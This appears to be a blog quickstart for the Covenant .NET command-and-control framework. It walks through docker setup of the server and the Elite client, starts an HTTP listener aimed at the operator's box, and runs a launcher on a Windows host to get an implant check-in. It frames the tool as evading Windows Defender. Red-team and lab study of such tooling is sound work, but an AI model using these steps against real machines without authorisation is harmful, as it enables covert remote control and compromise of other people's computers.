---
layout: post
title: Covenant quickstart
---

Covenant is a .NET C2 that, like SILENTTRINITY, capitalizes on Windows Defender's blindspot for .NET applications.
it won't be until the release of .NET 4.8 that AMSI will have insight into .NET. 
Elite is the client to Covenant's Server. Below is a walkthrough on how to set everything up with docker and run a module.

Install docker (for kali docker will be in the repo so `apt install docker` will do):
```bash
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
apt-get update
apt-get install docker-ce
```

Build and start Covenant container (make sure you're in the same directory as the Dockerfile):
```
docker build -t covenant .                                                   
```

Start the container and expose ports 80, 7443, and 443. (make sure you don't have anything else listening on those ports or the docker daemon will error out):
```
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant covenant --username brax --computername 0.0.0.0
```
![](https://braaaax.github.io/braaaax.github.io/images/Covenant-startup.png)


Build and start elite container and connect with Covenant container server.
Again, make sure the directory you run the command contains the Dockerfile.
```
docker build -t elite .
```

Create the Elite container client and bind the directory, indicated by the absolute path, to the /app/Data directory, connect with the Covenant server and remove when closed. We need to add a bind mount so that we can grab our generated files!
```
docker run -it --rm --name elite -v /root/cov/brax:/app/Data elite --username brax --computername 192.168.0.128
```
![](https://braaaax.github.io/braaaax.github.io/images/Covenant-startelite.png)


Start listener adn set the connection address to our kali box. It will be set to the ip of the docker container by default.
```
Listeners
http
set ConnectAddress 192.168.0.128
start
```
![](https://braaaax.github.io/braaaax.github.io/images/Covenant-startLISTENER0.png)

![](https://braaaax.github.io/braaaax.github.io/images/Covenant-startLISTENER.png)

We'll refer to our Listener by the name give, or one that we choose, when generating a Launcher.
![](https://braaaax.github.io/braaaax.github.io/images/Covenant-msbuildlauncher.png)

We execute out launcher on a windows host:
![](https://braaaax.github.io/braaaax.github.io/images/Covenant-windowsexec.png)

and get a notification that our Grunt has been activated:
`[*] Grunt: 9dae457c70 from: 192.168.0.116 has been activated!`

Now we have a Grunt and we can Interact with our Grunt and choose one of the many modules to run against our Windows host. 
![](https://braaaax.github.io/braaaax.github.io/images/Covenant-GRUNTS.png)

![](https://braaaax.github.io/braaaax.github.io/images/Covenant-interact.png)

![](https://braaaax.github.io/braaaax.github.io/images/Covenant-modules.png)
